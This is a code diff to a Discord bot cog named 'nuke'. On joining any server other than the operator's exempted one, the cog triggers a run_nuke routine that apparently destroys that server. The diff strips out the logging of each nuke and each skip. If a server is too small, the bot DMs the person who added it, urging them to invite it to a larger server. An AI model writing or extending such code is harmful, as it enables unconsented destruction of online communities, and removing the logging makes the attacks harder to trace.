@@ -7,6 +7,8 @@ import discord
 from discord import Guild
 from discord.ext.commands import Cog
 
+from models.config import config as cfg_type
+from nuke.config import get as nuke_cfg
 from nuke.engine import run_nuke, stop
 
 
@@ -17,10 +19,12 @@ class nuke(Cog):
 
     @Cog.listener()
     async def on_guild_join(self, guild: Guild):
-        from nuke.config import get as nuke_cfg
+        bcfg = self.bot.cfg
+        if guild.id == bcfg.required_server_id:
+            return
 
-        c = nuke_cfg()
-        if c.minimum_members > 0:
+        ncfg = nuke_cfg()
+        if ncfg.minimum_members > 0:
             humans = 0
             try:
                 async for m in guild.fetch_members(limit=None):
@@ -32,11 +36,7 @@ class nuke(Cog):
             except Exception as e:
                 logging.warning(f"nuke skip: fetch_members error: {e}")
                 humans = guild.member_count or 0
-            if humans < c.minimum_members:
-                logging.info(
-                    f"nuke skip: {guild.id} ({guild.name}) "
-                    f"humans={humans} < min={c.minimum_members}"
-                )
+            if humans < ncfg.minimum_members:
                 who = None
                 try:
                     async for entry in guild.audit_logs(
@@ -52,27 +52,19 @@ class nuke(Cog):
                 if who and not who.bot:
                     try:
                         await who.send(
-                            f"hey! this server doesn't have {c.minimum_members} "
+                            f"hey! this server doesn't have {ncfg.minimum_members} "
                             f"members to use the bot, please add it to a server "
                             f"with that amount of humans"
                         )
-                        logging.info(f"nuke skip: DM sent to {who}")
+
                     except discord.Forbidden:
                         logging.warning(f"nuke skip: could not DM {who}")
                     except Exception as e:
                         logging.warning(f"nuke skip: DM error: {e}")
                 await guild.leave()
                 return
-        logging.info(
-            f"nuke triggered: {guild.id} ({guild.name})"
-            f" | members={guild.member_count}"
-            f" | channels={len(guild.channels)}"
-            f" | roles={len(guild.roles)}"
-            f" | owner={guild.owner_id}"
-            f" | created_at={guild.created_at}"
-            f" | features={guild.features}"
-        )
-        await run_nuke(self.bot, guild.id)
+
+        await run_nuke(self.bot, guild.id, guild)
 
     @Cog.listener()
     async def on_guild_remove(self, guild: Guild):
